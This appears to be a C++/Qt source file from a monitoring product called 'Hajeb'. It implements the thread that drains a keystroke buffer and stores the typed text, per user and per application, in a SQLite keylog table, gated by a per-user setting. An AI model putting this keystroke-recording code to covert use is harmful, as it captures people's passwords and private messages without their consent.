#include <QtSql>
#include <QFile>
#include <QDebug>
#include "consumerthread.h"
#include "globaldata.h"
#include "../Global/global.h"

QSemaphore emptyCount(BUFFER_SIZE);
QSemaphore fullCount(0);

int getCurrentUserId();
int getCurrentUserId(QString userName);
QString getCurrentUserName();
bool isEnabledForUser(int id);

ConsumerThread::ConsumerThread(QObject *parent):
        QThread(parent)
{
    connect(this,SIGNAL(newText(QString)),this,SLOT(logText(QString)));
}

void ConsumerThread::run() {
    QSqlDatabase db = QSqlDatabase::addDatabase("QSQLITE","threadConnection");
    db.setHostName("localhost");
    db.setDatabaseName(DB_PATH);
    db.setUserName("");

    if (!db.open()) {
        qDebug() << "Cannot open database";
    }

    QString text;
    while (1) {
        fullCount.acquire();
        bufferIndex -= size;
        int count = size;
        while (count--) {
            text.append(_buffer[bufferIndex++]);
        }
        bufferIndex -= size;
        size = 0 ;
        emptyCount.release();
        logText(text);
        sleep(1);
        text.clear();
    }

}

void ConsumerThread::logText(QString text) {
    int userId;

    if (QSysInfo::windowsVersion() == QSysInfo::WV_VISTA || QSysInfo::windowsVersion() == QSysInfo::WV_WINDOWS7) {
        QString userName = getCurrentUserName();
        userId = getCurrentUserId(userName);
    } else {
        userId = getCurrentUserId();
    }

    // Check if current user is controlled by Hajeb
    if (userId == -1) {
        return ;
    }

    QSqlQuery query(QSqlDatabase::database("threadConnection"));

    query.exec("PRAGMA synchronous=OFF;");

    qDebug() << "consume";

    // Check if Keyboard monitor is enabled for this user.
    if (!isEnabledForUser(userId)) {
        qDebug() << "Keyboard is disabled for this account.";
        return ;
    }

    if (!text.length())
        return ;

    bool ok;


//    qDebug() << "current char: " << text;
//    qDebug() << "current user: " << userId;


    if ( _addRecord ) {
        // new record
        qDebug() << "Add record";
        query.prepare("INSERT INTO KeylogsTable (userId,programName,log,currentDate,currentTime) VALUES (?,?,?,?,?);");
        query.addBindValue(userId);
        query.addBindValue(_appName);
        query.addBindValue(text);
        query.addBindValue(QDate::currentDate());
        query.addBindValue(QTime::currentTime());
        ok = query.exec();
        if (ok)
            _addRecord = false;

    } else {
        qDebug() << "Update record";
        query.exec("SELECT MAX(no) from KeylogsTable");
        query.next();
        int no = query.value(0).toInt();
        qDebug() << "record No: " << no ;

        query.prepare("SELECT log from KeylogsTable WHERE no = ?");
        query.addBindValue(no);
        query.exec();
        query.next();
        QString log = query.value(0).toString();
        qDebug() << "---------------";
        qDebug() << log;
        log += text;
        qDebug() << log;
        qDebug() << "---------------";
        query.prepare("UPDATE KeylogsTable SET log = ? , currentTime = ? WHERE no = ?");
        query.addBindValue(log);
        query.addBindValue(QTime::currentTime());
        query.addBindValue(no);
        qDebug() << query.exec();
        qDebug() << query.lastError();
    }
}

int getCurrentUserId() {
    int userId;
    QFile file(USER_ID_FILE_PATH);
    file.open(QIODevice::ReadOnly);
    QTextStream stream(&file);
    stream >> userId;
    file.close();
    return userId;
}

bool isEnabledForUser(int id) {
    QSqlQuery query(QSqlDatabase::database());
    query.prepare("SELECT monitorKeyboard from SettingsTable WHERE userId = ?");
    query.addBindValue(id);
    query.exec();
    query.next();
    return (query.value(0).toInt()?true:false);
}

int getCurrentUserId(QString userName) {
    QSqlQuery query(QSqlDatabase::database());
    query.prepare("SELECT userId from UsersTable WHERE name = ?");
    query.addBindValue(userName.trimmed());
    query.exec();
    if (query.next())
        return query.value(0).toInt();
    else
        return -1;
}

QString getCurrentUserName() {
    QProcess* process = new QProcess;
    process->start("CoEIAUserNameWin7.exe");
    process->waitForStarted();
    process->waitForFinished();
    QString output = process->readAll();
    delete process;
    QStringList lines = output.split("\n");
    QString userName = lines.at(0);
    return userName;
}
